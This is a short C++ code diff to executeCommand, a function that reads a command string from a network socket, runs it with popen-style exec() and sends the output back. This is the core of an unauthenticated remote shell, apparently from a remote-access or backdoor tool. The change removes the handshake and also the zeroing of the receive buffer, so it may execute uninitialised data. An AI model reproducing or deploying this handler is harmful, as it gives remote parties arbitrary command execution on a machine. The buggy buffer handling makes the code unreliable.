@@ -66,25 +66,18 @@ std::string exec(const char* cmd)
 	_pclose(pipe);
 	return result;
 }
+
 void executeCommand(SocketManager socketManager, SOCKET socket)
 {
+	int result; 
 	char recvbuf[DEFAULT_BUFLEN * 4];
-	int iResult, iResult2;
-	memset(recvbuf, 0, DEFAULT_BUFLEN * 4);
-	iResult = socketManager.receive(socket, recvbuf, DEFAULT_BUFLEN * 4);
-	iResult2 = socketManager.send_data(socket, "ok");//ok
+	
+	result = socketManager.receive(socket, recvbuf, DEFAULT_BUFLEN * 4);
+	
 	std::string w = exec(recvbuf);
 	cout << w.c_str() << endl;
-	socketManager.send_data(socket, w.c_str());
-	memset(recvbuf, 0, DEFAULT_BUFLEN * 4);//
-	iResult = socketManager.receive(socket, recvbuf, 2);//ok
-	memset(recvbuf, 0, DEFAULT_BUFLEN * 4);
-	iResult = socketManager.receive(socket, recvbuf, DEFAULT_BUFLEN * 4);
-	iResult2 = socketManager.send_data(socket, "ok");
-	if (!strcmp(recvbuf, "END_EXECUTE"))
-	{
-		cout << "end execute" << endl;
-	}
+	
+	result = socketManager.send_data(socket, w.c_str());
 }
 
 void dirInfo(SocketManager socketManager, SOCKET socket)
